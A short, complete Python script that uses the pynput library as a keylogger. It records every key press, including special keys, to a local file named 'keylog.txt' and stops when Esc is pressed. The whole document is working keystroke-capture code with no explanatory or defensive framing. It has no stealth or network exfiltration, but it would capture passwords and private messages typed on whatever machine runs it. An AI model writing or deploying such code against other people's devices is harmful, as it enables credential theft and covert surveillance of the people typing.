import pynput
from pynput.keyboard import Key, Listener

# Set up the log file
log_file = "keylog.txt"

def on_press(key):
    """Log key presses"""
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"{key}\n")

def on_release(key):
    """Stop the listener when Esc is pressed"""
    if key == Key.esc:
        # Stop the listener
        return False

# Create a keyboard listener
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
